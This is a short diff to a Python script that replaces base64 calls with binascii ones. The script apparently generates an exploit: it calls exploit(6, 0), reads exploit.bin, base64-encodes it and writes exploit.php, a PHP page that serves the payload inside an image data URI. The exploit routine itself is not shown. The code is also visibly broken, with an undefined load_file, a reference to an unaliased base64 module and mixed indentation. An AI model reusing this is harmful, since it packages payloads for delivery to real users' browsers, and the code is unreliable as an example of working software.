@@ -1,4 +1,3 @@
-import base64 as i
 import binascii as l
 import logging as f
 import os as j
@@ -98,7 +97,7 @@ class WaffleIron:
         			load.close()
       			else:
         			save=open(y, 'wb')
-        			m.dump(str(base64.b64decode(batter)), save)
+        			m.dump(str(l.a2b_base64(batter)), save)
         			save.close()
         			load=open(y, 'rb')
 				cookedb=m.load(load_file)
@@ -204,7 +203,7 @@ def run():
     )
   exploit(6, 0)
   data = open('exploit.bin', 'rb').read()
-  a = i.b64encode(data)
+  a = l.b2a_base64(data)
   b = a.decode()
   html = '<?php\n$htmlcode = "<img src=\\"data:image/png;base64,' + b + '\\">";\necho $htmlcode\n?>'
   open('exploit.php', 'w').write(html)
